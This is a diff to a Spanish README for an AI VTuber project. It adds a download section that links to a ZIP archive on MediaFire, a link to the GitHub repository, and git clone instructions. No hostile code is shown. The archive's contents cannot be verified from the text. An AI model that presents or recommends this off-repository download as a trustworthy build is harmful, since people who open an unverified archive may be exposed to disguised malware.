@@ -242,6 +242,34 @@ La interfaz principal está desarrollada con:
 
 ---
 
+# ⬇️ Descarga
+
+<div align="center">
+
+## 🚀 Obtener Karin VTuber IA
+
+### [Repositorio Oficial](https://github.com/manuel00084/Karin-VTuber--IA-)
+
+Sistema VTuber IA experimental enfocado en interacción, automatización y streaming en tiempo real.
+
+
+<p align="center">
+  <img src="https://i.blogs.es/fcb991/mediafire/600_315.png" width="220" alt="Download">
+</p>
+https://www.mediafire.com/file/a1zrch07ao6g0n5/KarinVTuber.zip/file
+
+</div>
+
+---
+
+## 📦 Métodos de Instalación
+
+### 🔹 Clonar Repositorio
+
+```bash
+git clone https://github.com/manuel00084/Karin-VTuber--IA-.git
+cd Karin-VTuber--IA-
+
 # ⚡ Instalación
 
 ## 1. Clonar repositorio
